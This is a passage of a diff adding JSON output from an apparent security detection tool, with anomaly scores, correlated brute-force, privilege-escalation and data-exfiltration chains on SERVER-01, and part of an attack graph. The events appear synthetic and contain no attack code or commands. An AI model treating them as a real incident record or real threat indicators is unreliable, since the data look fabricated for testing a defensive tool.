+      "event_id": "e6c796d169254b838237d40413d78388",
+      "raw_score": -0.128418687262303,
+      "normalized_score": 0.628418687262303,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "failed_login_count": 17.0,
+        "login_frequency_per_min": 11.846318244934082,
+        "source_diversity_score": 6.077752590179443,
+        "time_span_minutes": 4.495363712310791,
+        "event_type_diversity": 3.3308675289154053
+      }
+    },
+    {
+      "event_id": "277ed35271ab4c2281f67035338937b7",
+      "raw_score": -0.10208761458965054,
+      "normalized_score": 0.6020876145896505,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "failed_login_count": 17.0,
+        "login_frequency_per_min": 9.670014381408691,
+        "source_diversity_score": 3.8941287994384766,
+        "time_span_minutes": 3.7427077293395996,
+        "bytes_sent_per_connection": 2.1385200023651123
+      }
+    },
+    {
+      "event_id": "ef12273119df42a7aaaf200c344607b4",
+      "raw_score": -0.0968796990230455,
+      "normalized_score": 0.5968796990230455,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "failed_login_count": 17.0,
+        "login_frequency_per_min": 8.68078327178955,
+        "source_diversity_score": 3.8941287994384766,
+        "time_span_minutes": 3.291114091873169,
+        "bytes_sent_per_connection": 2.1385200023651123
+      }
+    },
+    {
+      "event_id": "82760cc7e0b24e759ca325262d01cfe9",
+      "raw_score": -0.09560641035673623,
+      "normalized_score": 0.5956064103567362,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "failed_login_count": 17.0,
+        "login_frequency_per_min": 7.85642671585083,
+        "source_diversity_score": 3.8941287994384766,
+        "powershell_execution_count": 3.0,
+        "time_span_minutes": 2.8395204544067383
+      }
+    },
+    {
+      "event_id": "e6faa00bb99b4c8599d4df32c5b362b6",
+      "raw_score": -0.06723849156650874,
+      "normalized_score": 0.5672384915665087,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "failed_login_count": 17.0,
+        "login_frequency_per_min": 6.94963264465332,
+        "source_diversity_score": 3.8941287994384766,
+        "powershell_execution_count": 3.0,
+        "time_span_minutes": 2.237395763397217
+      }
+    },
+    {
+      "event_id": "e6042c1eaf204ff78bc926cf853349ca",
+      "raw_score": -0.047138855212318975,
+      "normalized_score": 0.547138855212319,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "failed_login_count": 17.0,
+        "login_frequency_per_min": 6.042839527130127,
+        "source_diversity_score": 3.8941287994384766,
+        "powershell_execution_count": 3.0,
+        "bytes_sent_per_connection": 2.1385200023651123
+      }
+    },
+    {
+      "event_id": "db1c07dd47624e45ac8ffef5741f0ada",
+      "raw_score": -0.04937826300036996,
+      "normalized_score": 0.54937826300037,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "failed_login_count": 17.0,
+        "login_frequency_per_min": 5.317404747009277,
+        "source_diversity_score": 3.8941287994384766,
+        "powershell_execution_count": 3.0,
+        "sensitive_file_access_count": 3.0
+      }
+    },
+    {
+      "event_id": "e19341b63e984eccb927e49bc4c16fd5",
+      "raw_score": -0.08415175134690522,
+      "normalized_score": 0.5841517513469052,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "bytes_sent_per_connection": 356447.59375,
+        "bytes_sent_total": 93366.2578125,
+        "failed_login_count": 17.0,
+        "login_frequency_per_min": 4.723866939544678,
+        "powershell_execution_count": 3.0
+      }
+    },
+    {
+      "event_id": "973b2f487b3747afb8ad493be41a0c97",
+      "raw_score": -0.06415993778135964,
+      "normalized_score": 0.5641599377813596,
+      "is_anomaly": true,
+      "top_contributing_features": {
+        "bytes_sent_per_connection": 178222.734375,
+        "bytes_sent_total": 93366.2578125,
+        "failed_login_count": 17.0,
+        "login_frequency_per_min": 4.515608310699463,
+        "powershell_execution_count": 3.0
+      }
+    }
+  ],
+  "attack_chains": [
+    {
+      "chain_id": "b7dff52b",
+      "attack_type": "coordinated_attack",
+      "correlation_score": 1.0,
+      "start_time": "2026-01-15T12:00:00+00:00",
+      "end_time": "2026-01-15T12:30:00+00:00",
+      "event_count": 20,
+      "entities": {
+        "source_ips": [
+          "185.20.30.42",
+          "185.20.30.18"
+        ],
+        "users": [
+          "admin"
+        ],
+        "devices": [
+          "SERVER-01"
+        ]
+      },
+      "description": "Entity-correlated chain via user=admin (20 events)",
+      "steps": [
+        {
+          "sequence": 0,
+          "timestamp": "2026-01-15T12:00:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 1,
+          "timestamp": "2026-01-15T12:01:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 2,
+          "timestamp": "2026-01-15T12:02:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 3,
+          "timestamp": "2026-01-15T12:03:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 4,
+          "timestamp": "2026-01-15T12:04:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 5,
+          "timestamp": "2026-01-15T12:05:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 6,
+          "timestamp": "2026-01-15T12:06:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 7,
+          "timestamp": "2026-01-15T12:07:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 8,
+          "timestamp": "2026-01-15T12:08:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 9,
+          "timestamp": "2026-01-15T12:09:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 10,
+          "timestamp": "2026-01-15T12:10:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 11,
+          "timestamp": "2026-01-15T12:11:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 12,
+          "timestamp": "2026-01-15T12:12:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 13,
+          "timestamp": "2026-01-15T12:13:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 14,
+          "timestamp": "2026-01-15T12:14:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 15,
+          "timestamp": "2026-01-15T12:15:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 16,
+          "timestamp": "2026-01-15T12:16:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 17,
+          "timestamp": "2026-01-15T12:17:00+00:00",
+          "event_type": "successful_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 18,
+          "timestamp": "2026-01-15T12:25:00+00:00",
+          "event_type": "privilege_escalation",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.18",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 19,
+          "timestamp": "2026-01-15T12:30:00+00:00",
+          "event_type": "powershell_execution",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        }
+      ]
+    },
+    {
+      "chain_id": "98eb4651",
+      "attack_type": "data_exfiltration",
+      "correlation_score": 1.0,
+      "start_time": "2026-01-15T12:33:00+00:00",
+      "end_time": "2026-01-15T12:55:00+00:00",
+      "event_count": 6,
+      "entities": {
+        "users": [
+          "admin"
+        ],
+        "devices": [
+          "SERVER-01"
+        ],
+        "source_ips": [
+          "10.0.0.100"
+        ],
+        "destination_ips": [
+          "185.20.30.18"
+        ]
+      },
+      "description": "Entity-correlated chain via user=admin (6 events)",
+      "steps": [
+        {
+          "sequence": 0,
+          "timestamp": "2026-01-15T12:33:00+00:00",
+          "event_type": "powershell_execution",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 1,
+          "timestamp": "2026-01-15T12:36:00+00:00",
+          "event_type": "powershell_execution",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 2,
+          "timestamp": "2026-01-15T12:40:00+00:00",
+          "event_type": "file_access",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 3,
+          "timestamp": "2026-01-15T12:45:00+00:00",
+          "event_type": "file_access",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 4,
+          "timestamp": "2026-01-15T12:50:00+00:00",
+          "event_type": "file_access",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        },
+        {
+          "sequence": 5,
+          "timestamp": "2026-01-15T12:55:00+00:00",
+          "event_type": "data_transfer",
+          "source": "network",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "10.0.0.100",
+          "destination_ip": "185.20.30.18",
+          "correlation_reasons": [
+            "shared_user:admin"
+          ]
+        }
+      ]
+    },
+    {
+      "chain_id": "152ea970",
+      "attack_type": "brute_force_to_compromise",
+      "correlation_score": 1.0,
+      "start_time": "2026-01-15T12:08:00+00:00",
+      "end_time": "2026-01-15T12:55:00+00:00",
+      "event_count": 6,
+      "entities": {
+        "source_ips": [
+          "185.20.30.42",
+          "185.20.30.18",
+          "10.0.0.100"
+        ],
+        "users": [
+          "admin"
+        ],
+        "devices": [
+          "SERVER-01"
+        ],
+        "destination_ips": [
+          "185.20.30.18"
+        ]
+      },
+      "description": "Attack pattern 'brute_force_to_compromise' matched: 6 steps",
+      "steps": [
+        {
+          "sequence": 0,
+          "timestamp": "2026-01-15T12:08:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "pattern:brute_force_to_compromise",
+            "step_0:failed_login"
+          ]
+        },
+        {
+          "sequence": 1,
+          "timestamp": "2026-01-15T12:17:00+00:00",
+          "event_type": "successful_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "pattern:brute_force_to_compromise",
+            "step_1:successful_login"
+          ]
+        },
+        {
+          "sequence": 2,
+          "timestamp": "2026-01-15T12:25:00+00:00",
+          "event_type": "privilege_escalation",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.18",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "pattern:brute_force_to_compromise",
+            "step_2:privilege_escalation"
+          ]
+        },
+        {
+          "sequence": 3,
+          "timestamp": "2026-01-15T12:30:00+00:00",
+          "event_type": "powershell_execution",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "pattern:brute_force_to_compromise",
+            "step_3:powershell_execution"
+          ]
+        },
+        {
+          "sequence": 4,
+          "timestamp": "2026-01-15T12:40:00+00:00",
+          "event_type": "file_access",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "pattern:brute_force_to_compromise",
+            "step_4:file_access"
+          ]
+        },
+        {
+          "sequence": 5,
+          "timestamp": "2026-01-15T12:55:00+00:00",
+          "event_type": "data_transfer",
+          "source": "network",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "10.0.0.100",
+          "destination_ip": "185.20.30.18",
+          "correlation_reasons": [
+            "pattern:brute_force_to_compromise",
+            "step_5:data_transfer"
+          ]
+        }
+      ]
+    },
+    {
+      "chain_id": "377428f8",
+      "attack_type": "coordinated_attack",
+      "correlation_score": 0.8,
+      "start_time": "2026-01-15T12:09:00+00:00",
+      "end_time": "2026-01-15T12:36:00+00:00",
+      "event_count": 13,
+      "entities": {
+        "source_ips": [
+          "185.20.30.42",
+          "185.20.30.18"
+        ],
+        "users": [
+          "admin"
+        ],
+        "devices": [
+          "SERVER-01"
+        ]
+      },
+      "description": "Temporal correlation: 13 events across 2 sources in 30min",
+      "steps": [
+        {
+          "sequence": 0,
+          "timestamp": "2026-01-15T12:09:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 1,
+          "timestamp": "2026-01-15T12:10:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 2,
+          "timestamp": "2026-01-15T12:11:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 3,
+          "timestamp": "2026-01-15T12:12:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 4,
+          "timestamp": "2026-01-15T12:13:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 5,
+          "timestamp": "2026-01-15T12:14:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 6,
+          "timestamp": "2026-01-15T12:15:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 7,
+          "timestamp": "2026-01-15T12:16:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 8,
+          "timestamp": "2026-01-15T12:17:00+00:00",
+          "event_type": "successful_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 9,
+          "timestamp": "2026-01-15T12:25:00+00:00",
+          "event_type": "privilege_escalation",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.18",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 10,
+          "timestamp": "2026-01-15T12:30:00+00:00",
+          "event_type": "powershell_execution",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 11,
+          "timestamp": "2026-01-15T12:33:00+00:00",
+          "event_type": "powershell_execution",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 12,
+          "timestamp": "2026-01-15T12:36:00+00:00",
+          "event_type": "powershell_execution",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        }
+      ]
+    },
+    {
+      "chain_id": "dc336107",
+      "attack_type": "data_exfiltration",
+      "correlation_score": 0.8,
+      "start_time": "2026-01-15T12:15:00+00:00",
+      "end_time": "2026-01-15T12:45:00+00:00",
+      "event_count": 9,
+      "entities": {
+        "source_ips": [
+          "185.20.30.42",
+          "185.20.30.18"
+        ],
+        "users": [
+          "admin"
+        ],
+        "devices": [
+          "SERVER-01"
+        ]
+      },
+      "description": "Temporal correlation: 9 events across 2 sources in 30min",
+      "steps": [
+        {
+          "sequence": 0,
+          "timestamp": "2026-01-15T12:15:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 1,
+          "timestamp": "2026-01-15T12:16:00+00:00",
+          "event_type": "failed_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 2,
+          "timestamp": "2026-01-15T12:17:00+00:00",
+          "event_type": "successful_login",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.42",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 3,
+          "timestamp": "2026-01-15T12:25:00+00:00",
+          "event_type": "privilege_escalation",
+          "source": "authentication",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "185.20.30.18",
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 4,
+          "timestamp": "2026-01-15T12:30:00+00:00",
+          "event_type": "powershell_execution",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 5,
+          "timestamp": "2026-01-15T12:33:00+00:00",
+          "event_type": "powershell_execution",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 6,
+          "timestamp": "2026-01-15T12:36:00+00:00",
+          "event_type": "powershell_execution",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 7,
+          "timestamp": "2026-01-15T12:40:00+00:00",
+          "event_type": "file_access",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 8,
+          "timestamp": "2026-01-15T12:45:00+00:00",
+          "event_type": "file_access",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        }
+      ]
+    },
+    {
+      "chain_id": "3e09fb9d",
+      "attack_type": "data_exfiltration",
+      "correlation_score": 0.8,
+      "start_time": "2026-01-15T12:45:00+00:00",
+      "end_time": "2026-01-15T12:55:00+00:00",
+      "event_count": 3,
+      "entities": {
+        "users": [
+          "admin"
+        ],
+        "devices": [
+          "SERVER-01"
+        ],
+        "source_ips": [
+          "10.0.0.100"
+        ],
+        "destination_ips": [
+          "185.20.30.18"
+        ]
+      },
+      "description": "Temporal correlation: 3 events across 2 sources in 30min",
+      "steps": [
+        {
+          "sequence": 0,
+          "timestamp": "2026-01-15T12:45:00+00:00",
+          "event_type": "file_access",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 1,
+          "timestamp": "2026-01-15T12:50:00+00:00",
+          "event_type": "file_access",
+          "source": "endpoint",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": null,
+          "destination_ip": null,
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        },
+        {
+          "sequence": 2,
+          "timestamp": "2026-01-15T12:55:00+00:00",
+          "event_type": "data_transfer",
+          "source": "network",
+          "user": "admin",
+          "device": "SERVER-01",
+          "source_ip": "10.0.0.100",
+          "destination_ip": "185.20.30.18",
+          "correlation_reasons": [
+            "temporal_proximity"
+          ]
+        }
+      ]
+    }
+  ],
+  "attack_graph": {
+    "graph_id": "937446d4",
+    "nodes": [
+      {
+        "id": "08486252",
+        "type": "ip",
+        "label": "IP: 185.20.30.42",
+        "value": "185.20.30.42",
+        "metadata": {
+          "is_external": true
+        },
+        "event_ids": [
+          "4fcb4dbd4cd1431c94db526fd54ef497",
+          "309e9d51b39345b5bfad361ee2e9211a",
+          "69f6267b20e14d7faf5c60b38e88b0dc",
+          "80096c5fdb8f4e0686bde45e20250ad9",
+          "95f0351da7fd423a923a42c6bf6aabd8",
+          "eef302367a7045d9b4b37f917a81bd78",
+          "332f05701143466ab9bf1c13e83481ce",
+          "4ecbf85e9a894515a4a0a3996fd504dc",
+          "7a018318b1ca48b2bf696cac1e8b4c79",
+          "6cdc0f2e0617416cba945318145c8897",
+          "4eba6038b5fc4a8293e5af029bd3267c",
+          "499cf096fc0a4781bf14775958a20d52",
+          "0c347bd66ea04d06ba628c3e2bf926cc",
+          "de6945dac2fb4191ba209735eb311bc6",
+          "8a21d5685aa8428592569b36dacc4856",
+          "a0fe63cb9fb2479b96151fea98a3a371",
+          "50c2bf772c594cedb63db1a5b08f3cf2",
+          "d492ce0b4b42460199064969fb3dad01"
+        ],
+        "risk_score": 0.0
+      },
+      {
+        "id": "57db29ad",
+        "type": "user",
+        "label": "User: admin",
+        "value": "admin",
+        "metadata": {},
+        "event_ids": [
+          "4fcb4dbd4cd1431c94db526fd54ef497",
+          "309e9d51b39345b5bfad361ee2e9211a",
+          "69f6267b20e14d7faf5c60b38e88b0dc",
+          "80096c5fdb8f4e0686bde45e20250ad9",
+          "95f0351da7fd423a923a42c6bf6aabd8",
+          "eef302367a7045d9b4b37f917a81bd78",
+          "332f05701143466ab9bf1c13e83481ce",
+          "4ecbf85e9a894515a4a0a3996fd504dc",
+          "7a018318b1ca48b2bf696cac1e8b4c79",
+          "6cdc0f2e0617416cba945318145c8897",
+          "4eba6038b5fc4a8293e5af029bd3267c",
+          "499cf096fc0a4781bf14775958a20d52",
+          "0c347bd66ea04d06ba628c3e2bf926cc",
+          "de6945dac2fb4191ba209735eb311bc6",
+          "8a21d5685aa8428592569b36dacc4856",
+          "a0fe63cb9fb2479b96151fea98a3a371",
+          "50c2bf772c594cedb63db1a5b08f3cf2",
+          "d492ce0b4b42460199064969fb3dad01",
+          "e6c796d169254b838237d40413d78388",
+          "277ed35271ab4c2281f67035338937b7",
+          "ef12273119df42a7aaaf200c344607b4",
+          "82760cc7e0b24e759ca325262d01cfe9",
+          "e6faa00bb99b4c8599d4df32c5b362b6",
+          "e6042c1eaf204ff78bc926cf853349ca",
+          "db1c07dd47624e45ac8ffef5741f0ada",
+          "e19341b63e984eccb927e49bc4c16fd5"
+        ],
+        "risk_score": 0.0
+      },
+      {
+        "id": "1b36543b",
+        "type": "device",
+        "label": "Device: SERVER-01",
+        "value": "SERVER-01",
+        "metadata": {},
+        "event_ids": [
+          "4fcb4dbd4cd1431c94db526fd54ef497",
+          "309e9d51b39345b5bfad361ee2e9211a",
+          "69f6267b20e14d7faf5c60b38e88b0dc",
+          "80096c5fdb8f4e0686bde45e20250ad9",
+          "95f0351da7fd423a923a42c6bf6aabd8",
+          "eef302367a7045d9b4b37f917a81bd78",
+          "332f05701143466ab9bf1c13e83481ce",
+          "4ecbf85e9a894515a4a0a3996fd504dc",
+          "7a018318b1ca48b2bf696cac1e8b4c79",
+          "6cdc0f2e0617416cba945318145c8897",
+          "4eba6038b5fc4a8293e5af029bd3267c",
+          "499cf096fc0a4781bf14775958a20d52",
+          "0c347bd66ea04d06ba628c3e2bf926cc",
+          "de6945dac2fb4191ba209735eb311bc6",
+          "8a21d5685aa8428592569b36dacc4856",
+          "a0fe63cb9fb2479b96151fea98a3a371",
+          "50c2bf772c594cedb63db1a5b08f3cf2",
+          "d492ce0b4b42460199064969fb3dad01",
+          "e6c796d169254b838237d40413d78388",
+          "277ed35271ab4c2281f67035338937b7",
+          "ef12273119df42a7aaaf200c344607b4",
+          "82760cc7e0b24e759ca325262d01cfe9",
+          "e6faa00bb99b4c8599d4df32c5b362b6",
+          "e6042c1eaf204ff78bc926cf853349ca",
+          "db1c07dd47624e45ac8ffef5741f0ada",
+          "e19341b63e984eccb927e49bc4c16fd5"
+        ],
+        "risk_score": 0.0
+      },
+      {
+        "id": "8a143ec4",
+        "type": "session",
+        "label": "Session: 75d6ea08-16db-4099-9250-c1bfca89d01d",
+        "value": "75d6ea08-16db-4099-9250-c1bfca89d01d",
+        "metadata": {},
+        "event_ids": [
+          "d492ce0b4b42460199064969fb3dad01"
+        ],
+        "risk_score": 0.0
+      },
+      {
+        "id": "7a5576c3",
+        "type": "ip",
+        "label": "IP: 185.20.30.18",
+        "value": "185.20.30.18",
+        "metadata": {
+          "is_external": true
+        },
+        "event_ids": [
+          "e6c796d169254b838237d40413d78388"
+        ],
+        "risk_score": 0.0
+      },
+      {
+        "id": "73c65929",
+        "type": "file",
+        "label": "File: C:\\HR\\salaries.xlsx",
+        "value": "C:\\HR\\salaries.xlsx",
+        "metadata": {
+          "size": 2003351
+        },
+        "event_ids": [
+          "e6faa00bb99b4c8599d4df32c5b362b6"
